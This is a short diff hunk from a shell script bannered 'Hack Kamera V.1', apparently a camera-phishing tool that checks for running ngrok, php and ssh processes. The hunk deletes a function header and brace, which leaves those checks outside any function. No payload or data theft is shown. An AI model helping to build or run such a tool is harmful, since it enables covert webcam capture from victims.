@@ -8,11 +8,6 @@ printf " \e[1;92m Hack Kamera V.1 Coded By MUKE_GILE.ID\e[0m \n"
 
 printf "\n"
 
-
-}
-
-stop() {
-
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
